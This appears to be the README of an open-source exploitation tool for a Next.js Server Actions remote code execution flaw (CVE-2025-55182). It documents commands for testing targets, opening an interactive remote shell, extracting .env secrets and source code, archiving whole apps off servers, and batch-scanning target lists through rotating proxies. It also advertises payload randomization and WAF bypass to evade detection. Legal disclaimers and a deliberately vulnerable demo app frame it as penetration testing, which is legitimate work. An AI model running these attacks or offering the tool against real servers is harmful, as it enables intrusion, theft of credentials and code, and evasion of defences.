# React2Shell (R2S) - CVE-2025-55182 Testing Tool

<div align="center">

![R2S Banner](https://img.shields.io/badge/R2S-CVE--2025--55182-red)
![Python](https://img.shields.io/badge/Python-3.7+-blue)
![License](https://img.shields.io/badge/License-MIT-green)

**Advanced exploitation testing tool for CVE-2025-55182 vulnerability assessment**

[Features](#-features) • [Installation](#-installation) • [Usage](#-usage) • [Testing Environment](#-testing-environment) • [Legal](#-legal-disclaimer)

</div>

---

## 📖 What is R2S?

**R2S (React2Shell)** is a security testing tool designed to help security researchers, developers, and penetration testers assess whether their Next.js applications are vulnerable to **CVE-2025-55182**.

### Understanding CVE-2025-55182

CVE-2025-55182 is a critical vulnerability affecting Next.js Server Actions in certain versions (e.g., 16.0.5). This vulnerability allows attackers to execute arbitrary commands on the server through improperly secured Server Actions, leading to Remote Code Execution (RCE).

**R2S helps you check if your application has this problem** so you can fix it before bad actors find it.

---

## ⚠️ Important Notes

### Windows Commands Flag (`--windows`)

**⚠️ CRITICAL WARNING**: The `--windows` flag can cause the tool to **FAIL to determine vulnerability** if used incorrectly.

- **Default behavior**: Tool uses Unix/Linux commands (most Next.js servers run on Linux)
- **When to use `--windows`**: Only if you're 100% certain the target server is Windows
- **What happens if wrong**: If you use `--windows` on a Linux server, commands will fail and the tool may report "not vulnerable" even if the server is vulnerable
- **Best practice**: Let the tool auto-detect the platform, or don't use `--windows` unless you know the target is Windows

**Example:**
```bash
# ❌ WRONG - Using --windows on a Linux server
r2s -u http://linux-server.com -t --windows
# Result: Commands fail, tool may report "not vulnerable" (FALSE NEGATIVE)

# ✅ CORRECT - Let tool use default Unix/Linux commands
r2s -u http://linux-server.com -t
# Result: Proper detection of vulnerability
```

---

## ⚠️ Legal Disclaimer

**IMPORTANT: READ THIS BEFORE USING THIS TOOL**

1. **This tool is for LEGITIMATE security testing ONLY**
   - ✅ Test your own applications
   - ✅ Test applications you have written permission to test
   - ✅ Educational purposes and security research
   - ❌ **NEVER use on systems you don't own or have permission to test**
   - ❌ **NEVER use for malicious purposes**

2. **By using this tool, you agree that:**
   - You will only use it on systems you own or have explicit written permission to test
   - You understand that unauthorized access to computer systems is illegal
   - You accept full responsibility for your actions
   - The authors are not responsible for any misuse of this tool

3. **Legal Consequences:**
   - Unauthorized access to computer systems is a crime in most countries
   - You could face criminal charges, fines, and imprisonment
   - Always get written permission before testing

4. **This tool is provided "AS IS" without warranty of any kind**

**If you're under 18, make sure you have adult supervision and permission before using this tool.**

---

## ✨ Features

### Core Capabilities
- 🔍 **Vulnerability Detection** - Quickly test if a server is vulnerable to CVE-2025-55182
- 💻 **Interactive Shell** - Full interactive shell session over HTTPS with command history
- 📁 **File Operations** - List directories, read files, and export files/archives
- 🔐 **Secrets Extraction** - Attempt to read application secrets (.env files, config files)
- 📄 **Code Extraction** - Attempt to read application source code
- 🖥️ **System Information** - Gather OS info, hostname, user, and environment variables

### Advanced Features
- 🚀 **Auto-Warming Payloads** - Automatically optimizes payloads for best results
- ⚡ **Parallel Execution** - Run multiple commands simultaneously
- 🎲 **Payload Randomization** - Evade detection with dynamic payloads
- 🛠️ **Exploit Modules** - Metasploit-style module system (env_dump, file_search, network_scan, process_list)
- 🔄 **Redirect Handling** - Automatically follows HTTP redirects (301, 302, 303, 307, 308)
- 🎨 **Beautiful UI** - Color-coded output for easy reading
- 📊 **Comprehensive Reporting** - Auto-save reports in JSON, HTML, TXT formats with operation-specific formatters
- ⚙️ **Configuration System** - JSON-based config with interactive settings panel
- 📦 **Export Functionality** - Export single files or entire app directories as zip archives
- 🔒 **WAF Bypass** - Multiple bypass techniques (⚠️ Not guaranteed - see limitations below)

### Reporting & Logging
- 📝 **Auto-Save Reports** - Automatically save reports to `~/.r2s/reports/` with human-readable timestamps
- 📋 **Operation-Specific Formats** - Different report formats for different operations (shell, test, secrets, etc.)
- 📜 **Command History** - Persistent command history saved to `~/.r2s/history`
- 🔍 **Audit Trails** - Detailed logging of all operations to `~/.r2s/logs/audit.log`
- 🎨 **HTML Reports** - Beautiful HTML reports with dark/light mode, copy buttons, and code blocks

---

## 📦 Installation

### Option 1: Build from Source (Recommended)

1. **Clone the repository:**
   ```bash
   git clone https://github.com/zamdevio/r2s.git
   cd r2s
   ```

2. **Install dependencies:**
   ```bash
   pip install -r requirements.txt
   ```

3. **Build the standalone binary:**
   ```bash
   ./build.sh
   ```

4. **Install to system (optional):**
   ```bash
   sudo cp dist/r2s /usr/local/bin/
   sudo chmod +x /usr/local/bin/r2s
   ```

5. **Clean build artifacts (optional):**
   ```bash
   # Remove build/, dist/, __pycache__/, and other build files
   ./build.sh cleanup
   ```

### Option 2: Use Python Script Directly

```bash
# Install dependencies
pip install -r requirements.txt

# Run directly
python3 -m react2shell.main --help
# Or after building:
r2s --help
```

---

## 🚀 Quick Start

### Basic Vulnerability Test

```bash
# Test if a server is vulnerable
r2s -u http://localhost:3000 -t

# With verbose output for more details
r2s -u http://localhost:3000 -t -v
```

**⚠️ Important**: Don't use `--windows` unless you're certain the target is Windows. Using `--windows` on a Linux server will cause false negatives (tool may report "not vulnerable" even if the server is vulnerable).

### Test with Online Demo

We provide a safe testing environment at **https://r2s-arena.fly.dev**:

```bash
# Test the online demo
r2s -u https://r2s-arena.fly.dev -t
```

### Test Locally

See [`nextjs/README.md`](nextjs/README.md) for instructions on running the vulnerable app locally.

---

## 📚 Usage Examples

### Quick Command Reference

**Most Common Commands:**
- `r2s -u URL -t` - Test for vulnerability (most common)
- `r2s -u URL --shell` - Start interactive shell
- `r2s --targets FILE -t` - Batch scan multiple targets
- `r2s -u URL --system-info` - Get system information
- `r2s -u URL --secrets` - Attempt to read secrets
- `r2s -u URL --export-archive` - Export entire app as zip

**⚠️ Remember**: Don't use `--windows` unless target is Windows!

---

### Basic Operations

```bash
# Test vulnerability
r2s -u http://localhost:3000 -t

# List directory contents
r2s -u http://localhost:3000 --list-dir /app

# Read files
r2s -u http://localhost:3000 --read-file .env
r2s -u http://localhost:3000 --read-file package.json

# Get system information
r2s -u http://localhost:3000 --system-info

# Execute custom commands
r2s -u http://localhost:3000 --command "whoami"
r2s -u http://localhost:3000 --command "uname -a"
```

### Interactive Shell

```bash
# Start interactive shell session
r2s -u http://localhost:3000 --shell

# Features:
# - Arrow keys for command history (↑/↓)
# - Arrow keys for cursor movement (←/→)
# - Command aliases: nano/vi/vim/emacs → cat, clear → cls
# - Colored file/folder output in ls
# - Persistent history saved to ~/.r2s/history
# - Auto-save shell session reports
```

### Exploit Modules

```bash
# List available modules
r2s --list-modules

# Use a module
r2s -u http://localhost:3000 --module env_dump

# Use module with options
r2s -u http://localhost:3000 --module file_search --set pattern="*.env" --set path="/app"

# Get module information
r2s --module-info env_dump
```

### Export Functionality

```bash
# Export a single file
r2s -u http://localhost:3000 --export src/app/page.tsx
# Saved to: ~/.r2s/exports/{domain}/src/app/page.tsx

# Export entire app directory as zip archive
r2s -u http://localhost:3000 --export-archive
# 
# What it does:
# - Creates a zip archive of the entire app directory on the server
# - Automatically excludes files matching .gitignore patterns
# - Downloads the archive to your local machine
# - Automatically deletes the archive from the server after download
# - Saved to: ~/.r2s/exports/{domain}/r2s_export_TIMESTAMP.zip
# 
# Note: This operation may take a while for large applications

# Configure export directory
r2s settings
# Navigate to "export" section and set "export_dir"
```

### Secrets & Code Extraction

```bash
# Attempt to read application secrets
r2s -u http://localhost:3000 --secrets
# Tries: .env, .env.local, .env.production, config.json, etc.

# Attempt to read application source code
r2s -u http://localhost:3000 --code
# Tries: src/**/*.ts, src/**/*.tsx, src/**/*.js, etc.
```

### Batch Scanning (Multiple Targets)

```bash
# Scan multiple targets from file (one URL per line)
r2s --targets targets.txt -t

# Batch mode: no interactive prompts, auto-continue
r2s --targets targets.txt --batch -t

# Scan with rate limiting (2 requests per second)
r2s --targets targets.txt -t --rate 2

# Add delay between targets (1 second)
r2s --targets targets.txt -t --delay 1

# Combine options for safe batch scanning
r2s --targets targets.txt --batch -t --rate 1 --delay 2
```

### Advanced Options

```bash
# Parallel execution (run multiple commands simultaneously)
r2s -u http://localhost:3000 --parallel 5 --command "whoami;id;uname -a"

# WAF bypass (⚠️ Not guaranteed - see limitations below)
r2s -u http://localhost:3000 -t --waf-bypass

# Auto-warm payloads (optimize payloads before execution)
r2s -u http://localhost:3000 -t --auto-warm

# Randomize payloads (evade static detection)
r2s -u http://localhost:3000 --command "whoami" --randomize

# Different header strategies
r2s -u http://localhost:3000 -t --header-strategy chrome_latest
# Options: default, chrome_latest, firefox, minimal, assetnote

# Custom timeout (0 = no timeout)
r2s -u http://localhost:3000 --command "long-running-command" --timeout 0

# Disable SSL verification
r2s -u https://target.com -t --insecure

# Rate limiting (requests per second)
r2s -u http://localhost:3000 -t --rate 2

# Delay between requests (seconds)
r2s -u http://localhost:3000 --command "whoami" --delay 1
```

### Proxy & Network Options

```bash
# Use HTTP proxy
r2s -u http://localhost:3000 -t --proxy http://proxy.example.com:8080

# Use proxy with authentication
r2s -u http://localhost:3000 -t --proxy http://user:pass@proxy.example.com:8080

# Load and rotate proxies from file (one proxy per line)
r2s -u http://localhost:3000 -t --proxy-file proxies.txt

# Rate limiting with proxy rotation
r2s --targets targets.txt -t --proxy-file proxies.txt --rate 1
```

### Logging & Audit

```bash
# Log all operations to specific file
r2s -u http://localhost:3000 -t --log r2s_session.log

# Create detailed audit trail (saved to ~/.r2s/logs/audit.log)
r2s -u http://localhost:3000 -t --audit

# Combine logging with batch scanning
r2s --targets targets.txt --batch -t --log batch_scan.log --audit
```

### Settings & Configuration

```bash
# Open interactive settings panel
r2s settings

# Configure:
# - Report formats (JSON, HTML, TXT per operation)
# - Auto-save reports (on/off)
# - Export directory
# - Default timeouts
# - And more...

# Clean up all tool data
r2s cleanup
# Removes: config, history, logs, reports, exports

# Uninstall the tool (standalone binaries only)
r2s uninstall
```

### Reporting

```bash
# Reports are auto-saved to ~/.r2s/reports/ by default
# Format: {operation}_{YYYYMMDD_HHMMSS}.{json,html,txt}

# Disable auto-save
r2s -u http://localhost:3000 -t --no-report

# Save to specific location (disables auto-save)
r2s -u http://localhost:3000 -t --output /path/to/report.json

# View reports
ls ~/.r2s/reports/
cat ~/.r2s/reports/test_20251206_120000.html
```

---

## 🎯 Common Use Cases

### 1. Testing Your Own Application

```bash
# Start your Next.js app
cd my-nextjs-app
npm run dev

# In another terminal, test it
r2s -u http://localhost:3000 -t
```

### 2. Security Audit

```bash
# Comprehensive security check
r2s -u http://localhost:3000 -t --waf-bypass
r2s -u http://localhost:3000 --system-info
r2s -u http://localhost:3000 --secrets
r2s -u http://localhost:3000 --code
r2s -u http://localhost:3000 --export-archive
```

### 3. Educational Testing

Use the provided `nextjs` application for safe, local testing:

```bash
cd nextjs
npm install
npm run dev
# Test in another terminal
r2s -u http://localhost:3000 -t
```

See [`nextjs/README.md`](nextjs/README.md) for detailed instructions.

---

## 🏗️ Architecture

R2S uses a modular architecture for maintainability and extensibility:

```
react2shell/
├── main.py              # Main entry point
├── classes/             # Core classes
│   ├── detector.py     # Target detection
│   ├── executor.py     # Command execution
│   ├── modules.py      # Exploit modules system
│   ├── operations.py   # High-level operations
│   ├── payload.py      # Payload building and randomization
│   └── shell.py        # Interactive shell
├── services/            # Services
│   ├── config.py       # Configuration management (JSON)
│   ├── exporter.py     # File and archive export
│   ├── formatters.py   # Report formatters
│   ├── history.py      # Command history
│   ├── logger.py       # Logging and audit trails
│   ├── proxy.py        # Proxy management
│   └── reporter.py     # Report generation
└── utils/              # Utilities
    ├── colors.py       # Color utilities
    └── helpers.py      # Helper functions
```

See [`react2shell/README.md`](react2shell/README.md) for detailed architecture documentation.

---

## 🧪 Testing Environment

We provide a **safe testing environment** called `nextjs` that you can use to test the tool without risking real systems.

### Online Demo

Visit: **https://r2s-arena.fly.dev**

This is a publicly available, intentionally vulnerable application for testing purposes only.

### Local Testing

See [`nextjs/README.md`](nextjs/README.md) for instructions on running it locally.

**⚠️ Important:** The nextjs application is **intentionally vulnerable** and should **NEVER** be used in production or with real data.

---

## 📖 Command Reference

### Basic Commands

| Command | Description |
|---------|-------------|
| `-u, --url URL` | Target URL (required for most operations) |
| `-t, --test` | Test if server is vulnerable |
| `-ld, --list-dir PATH` | List directory contents |
| `-rf, --read-file FILE` | Read file contents |
| `-si, --system-info` | Get system information |
| `-sr, --secrets` | Attempt to read secrets |
| `-c, --code` | Attempt to read source code |
| `-cmd, --command CMD` | Execute custom command |
| `--shell` | Start interactive shell |

### Export Commands

| Command | Description |
|---------|-------------|
| `--export FILE, --ex FILE` | Export a single file from target (saved to ~/.r2s/exports/{domain}/) |
| `--export-archive` | Export entire app directory as zip archive. Creates zip on server, downloads it, then deletes from server. Excludes .gitignore patterns. Saved to ~/.r2s/exports/{domain}/r2s_export_TIMESTAMP.zip |

### Module Commands

| Command | Description |
|---------|-------------|
| `--module NAME` | Execute exploit module |
| `--module-list, --list-modules` | List available modules |
| `--module-info NAME` | Show module information |
| `--set KEY=VALUE` | Set module option |

### Advanced Options

| Option | Description |
|--------|-------------|
| `--waf-bypass` | Try WAF bypass techniques (⚠️ Not guaranteed - see limitations below) |
| `--waf-bypass-size KB` | WAF bypass junk data size in KB (default: 128) |
| `--vercel-waf-bypass` | Enable Vercel-specific WAF bypass techniques |
| `--header-strategy STRATEGY` | HTTP header strategy: `default`, `chrome_latest`, `firefox`, `minimal`, `assetnote` |
| `--parallel N` | Execute N commands in parallel (useful for multiple commands) |
| `--auto-warm` | Automatically warm and optimize payloads before execution |
| `--randomize` | Randomize payloads to evade static detection |
| `--no-follow-redirects` | Don't automatically follow HTTP redirects (301, 302, etc.) |
| `-k, --insecure` | Disable SSL certificate verification (use with caution) |
| `--timeout SECONDS` | Request timeout in seconds (default: 10, use 0 for no timeout) |
| `--windows` | ⚠️ **WARNING**: Use Windows commands instead of Unix/Linux. **This can cause the tool to FAIL to determine vulnerability** if the target is actually Unix/Linux. Only use this if you're certain the target is Windows. |
| `--rate RATE` | Limit requests to RATE requests per second (useful for batch scanning) |
| `--delay SECONDS` | Add delay between requests in seconds (helps avoid rate limiting) |
| `--batch` | Batch mode: skip all interactive prompts, auto-continue (useful for automation) |

### Reporting Options

| Option | Description |
|--------|-------------|
| `--output FILE, -o FILE` | Save results to specific file (disables auto-save) |
| `--no-report` | Disable automatic report saving to ~/.r2s/reports/ |
| `--log FILE` | Log all operations to specified file (detailed operation log) |
| `--audit` | Create detailed audit trail (saved to ~/.r2s/logs/audit.log) |

### Network & Proxy Options

| Option | Description |
|--------|-------------|
| `--proxy URL` | Use HTTP proxy (format: `http://proxy:port` or `http://user:pass@proxy:port`) |
| `--proxy-file FILE` | Load and rotate proxies from file (one proxy per line, format: `http://proxy:port`) |
| `--rate RATE` | Limit requests to RATE requests per second (prevents overwhelming target) |
| `--delay SECONDS` | Add delay between requests in seconds (helps avoid rate limiting) |

### Batch & Automation Options

| Option | Description |
|--------|-------------|
| `--targets FILE` | Scan multiple targets from file (one URL per line, supports comments with `#`) |
| `--batch` | Batch mode: skip all interactive prompts, auto-continue (useful for automation/scripts) |

### Special Commands

| Command | Description |
|---------|-------------|
| `r2s settings` | Open interactive settings panel |
| `r2s cleanup` | Delete all R2S data (config, history, logs, reports, exports) |
| `r2s uninstall` | Uninstall R2S binary and all data |
| `r2s help` | Show help message |

---

## 🔧 Troubleshooting

### "SSL Error"
```bash
# Use --insecure flag to bypass SSL verification
r2s -u https://target.com -t --insecure
```

### "Connection Error"
- Check if the server is running
- Verify the URL is correct
- Check firewall settings
- Try increasing timeout: `--timeout 30`

### "Request Blocked"
```bash
# Try WAF bypass (⚠️ Not guaranteed - see WAF Bypass Limitations below)
r2s -u https://target.com -t --waf-bypass

# Try different header strategies
r2s -u https://target.com -t --header-strategy chrome_latest
r2s -u https://target.com -t --header-strategy firefox
```

### "Cannot Determine Vulnerability" or False Negatives

**⚠️ IMPORTANT: Windows Commands Flag**

If you're getting false negatives (tool says "not vulnerable" but target actually is), check:

1. **Did you use `--windows` flag?**
   - The `--windows` flag makes the tool use Windows commands (PowerShell, `dir`, etc.)
   - **If your target is Unix/Linux (most Next.js servers are), using `--windows` will cause the tool to FAIL**
   - The tool will try to execute Windows commands on a Linux server, which will fail
   - **Solution**: Remove the `--windows` flag (Unix/Linux is the default)

2. **Platform Detection**
   - The tool auto-detects the platform, but you can override it
   - Only use `--windows` if you're 100% certain the target is Windows
   - Most Next.js deployments are on Linux/Unix systems

3. **Test Command**
   - The default test uses Unix command: `echo $((41*271))`
   - With `--windows`, it uses: `powershell -c "41*271"`
   - If the server is Linux but you use Windows commands, the test will fail

**Example of the problem:**
```bash
# ❌ WRONG - This will fail if target is Linux
r2s -u http://linux-server.com -t --windows

# ✅ CORRECT - Let tool auto-detect or use default (Unix/Linux)
r2s -u http://linux-server.com -t
```

### WAF Bypass Limitations

**⚠️ Important:** The WAF bypass techniques in this tool are **NOT guaranteed** to work and have several limitations:

- **Not Universal**: Different WAFs use different detection methods. What works for one may not work for another.
- **Static Detection**: Some WAFs use static pattern matching that can be bypassed, but modern WAFs use behavioral analysis.
- **Rate Limiting**: Many WAFs implement rate limiting that can block repeated attempts.
- **Machine Learning**: Advanced WAFs use ML models that adapt and learn from attack patterns.
- **Cloudflare/AWS WAF**: Enterprise-grade WAFs (Cloudflare, AWS WAF, etc.) are extremely difficult to bypass.
- **No Guarantees**: The bypass techniques are experimental and may fail against well-configured WAFs.

**Best Practices:**
- Use WAF bypass as a last resort
- Try different header strategies (`--header-strategy`)
- Combine with `--randomize` for better results
- Understand that some targets may be impossible to bypass
- Always test on systems you own or have permission to test

### Build Issues
```bash
# Make sure Python 3.7+ is installed
python3 --version

# Install dependencies
pip install -r requirements.txt

# Clean previous build artifacts
./build.sh cleanup

# Try building again
./build.sh
```

### Cleaning Build Artifacts

To safely remove all build artifacts (build directories, cache files, etc.):

```bash
./build.sh cleanup
```

This will remove:
- `build/` directory (PyInstaller build files)
- `dist/` directory (compiled binaries)
- `__pycache__/` directories (Python cache, recursively)
- `*.pyc` files (compiled Python bytecode)
- `*.pyo` files (optimized Python bytecode)
- `*.spec` files (PyInstaller spec files)

**Note:** This only removes build artifacts, not your source code. The cleanup is safe and will ask for confirmation before proceeding.
```

---

## 📁 File Structure

```
r2s/
├── README.md                 # This file
├── LICENSE                   # MIT License
├── requirements.txt          # Python dependencies
├── build.sh                  # Build script for standalone binary
├── r2s_entry.py              # PyInstaller entry point
├── react2shell/              # Main package
│   ├── README.md            # Architecture documentation
│   ├── main.py              # Entry point
│   ├── classes/             # Core classes
│   ├── services/            # Services
│   └── utils/               # Utilities
└── nextjs/                   # Testing environment
    └── README.md            # Testing environment documentation
```

---

## 🤝 Contributing

Contributions are welcome! Please:

1. Fork the repository
2. Create a feature branch
3. Make your changes
4. Submit a pull request

**Remember:** Only contribute code that helps with legitimate security testing.

---

## 📝 License

This project is licensed under the MIT License - see the LICENSE file for details.

**However, the use of this tool is subject to the legal disclaimer above. Using this tool for unauthorized access is illegal and not covered by this license.**

---

## 👨‍💻 Developer

**zamdevio**

- GitHub: [https://github.com/zamdevio](https://github.com/zamdevio)
- Project Repository: [https://github.com/zamdevio/r2s](https://github.com/zamdevio/r2s)

---

## 🙏 Acknowledgments

- Security researchers who discovered CVE-2025-55182
- The open-source security community
- All contributors to this project

---

## 📞 Support

- **Issues:** [GitHub Issues](https://github.com/zamdevio/r2s/issues)
- **Security:** Report security issues responsibly

---

## ⚠️ Final Reminder

**This tool is for security testing and educational purposes ONLY.**

- ✅ Always get permission before testing
- ✅ Only test systems you own or have permission to test
- ✅ Use responsibly and ethically
- ❌ Never use for malicious purposes
- ❌ Never test systems without permission

**Stay legal, stay ethical, stay safe! 🛡️**

---

<div align="center">

**Made with ❤️ for the security community**

[⬆ Back to Top](#react2shell-r2s---cve-2025-55182-testing-tool)

</div>
